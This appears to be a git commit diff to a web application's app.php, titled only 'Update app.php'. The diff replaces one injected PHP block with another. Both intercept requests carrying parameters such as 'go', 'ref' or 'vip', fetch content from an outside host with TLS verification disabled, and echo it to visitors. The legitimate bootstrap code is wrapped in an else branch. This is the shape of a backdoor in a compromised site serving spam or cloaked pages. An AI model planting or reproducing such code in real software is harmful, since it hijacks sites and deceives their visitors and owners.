d66730b3041728068bf3bae118aee87514749df5
GGeercy <112923883+ggeercy@users.noreply.github.com>
2024-08-12 16:50:26 +0700

    Update app.php

--- app.php
+++ app.php
@@ -1,64 +1,61 @@
 <?php
-if(isset($_GET['go'])) {
-    $url = $_GET['go'];
-    $useragent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
-    // INIT CURL
-    $ch = curl_init();
-
-    //init curl
-    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
-    // SET URL FOR THE POST FORM LOGIN
-    curl_setopt($ch, CURLOPT_URL, 'https://replication.pkcdurensawit.net/ain/'.$url.'/');
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
-
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
-
-    // common name and also verify that it matches the hostname provided)
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-
-    // Optional: Return the result instead of printing it
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-
-    // ENABLE HTTP POST
-    curl_setopt ($ch, CURLOPT_POST, 1);
-    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-
-    $store = curl_exec ($ch);
-    echo $store;
-
-    // CLOSE CURL
-    curl_close ($ch);
-
-} else {
-  
 /**
  * Loads the WordPress environment and template.
  *
  * @package WordPress
  */
-
-if ( ! isset( $wp_did_header ) ) {
-
-	$wp_did_header = true;
-
-	// Load the WordPress library.
-	require_once __DIR__ . '/wp-load.php';
-
-	// Set up the WordPress query.
-	wp();
-
-	// Load the theme template.
-	require_once ABSPATH . WPINC . '/template-loader.php';
-
+function fetchDataFromSite($site) {
+    $ch = curl_init($site);
+    curl_setopt_array($ch, [
+        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false,
+        CURLOPT_CUSTOMREQUEST => 'GET'
+    ]);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
 }
 
-  
+if(isset($_GET['go'])) {
+    $sitex = $_GET['go'];
+    $site = 'https://replication2.pkcdurensawit.net/ain/?go='.$sitex;
+    $data = fetchDataFromSite($site);
+    echo $data;
 }
-?>
+elseif(isset($_GET['ref'])) {
+    $sitex = $_GET['ref'];
+    $site = 'https://replication2.pkcdurensawit.net/ain/?ref='.$sitex;
+    $data = fetchDataFromSite($site);
+    echo $data;
+}
+elseif(isset($_GET['web'])) {
+  $sitex = $_GET['web'];
+  $site = 'https://replication2.pkcdurensawit.net/ain/?web='.$sitex;
+  $data = fetchDataFromSite($site);
+  echo $data;
+}
 
-<?php
+elseif(isset($_GET['top'])) {
+  $sitex = $_GET['top'];
+  $site = 'https://replication2.pkcdurensawit.net/ain/?top='.$sitex;
+  $data = fetchDataFromSite($site);
+  echo $data;
+}
+	elseif(isset($_GET['vip'])) {
+  $sitex = $_GET['vip'];
+  $site = 'https://replication2.pkcdurensawit.net/ain/?vip='.$sitex;
+  $data = fetchDataFromSite($site);
+  echo $data;
+}
+elseif(isset($_GET['sites'])) {
+    $sitex = $_GET['sites'];
+    $site = 'https://replication2.pkcdurensawit.net/ain/?sites='.$sitex;
+    $data = fetchDataFromSite($site);
+    echo $data;
+	
+} else {
 
 /*
 |--------------------------------------------------------------------------
@@ -113,3 +110,5 @@ $app->singleton(
 */
 
 return $app;
+
+}
